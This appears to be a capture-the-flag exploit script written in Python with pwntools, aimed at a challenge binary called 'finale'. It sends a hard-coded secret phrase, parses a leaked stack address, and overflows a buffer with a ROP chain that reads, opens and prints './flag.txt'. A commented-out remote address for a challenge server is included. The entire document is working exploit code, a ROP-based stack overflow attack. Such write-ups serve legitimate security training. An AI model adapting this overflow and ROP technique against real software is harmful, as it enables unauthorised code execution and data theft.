from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

io = process('./finale')
#ip, port = '161.35.162.53', 30362
#io = remote(ip, port)

elf = ELF('./finale')

io.sendlineafter('tell us the secret phrase:', 's34s0nf1n4l3b00')
io.recvuntil('good luck: ')
buf_addr = p64(int(io.recvuntil('\n').split('[')[1].split(']')[0], 16))
#print hex(u64(buf_addr))

pop_rdi_ret = 0x00000000004012d6
pop_rsi_ret = 0x00000000004012d8

padding = 'A'*(64+8)
payload = padding
#read ./flag.txt from stdin to stack
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_ret)
payload += buf_addr
payload += p64(0x00401170)
#open ./flag.txt
payload += p64(pop_rdi_ret)
payload += buf_addr
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(0x004011c0)
#read flag into stack
payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(pop_rsi_ret)
payload += buf_addr
payload += p64(0x00401170)
#puts the flag
payload += p64(pop_rdi_ret)
payload += buf_addr
payload += p64(0x00401120)

io.sendlineafter('tell us a wish for next year:', payload)
io.sendline('./flag.txt')
print io.recvall()

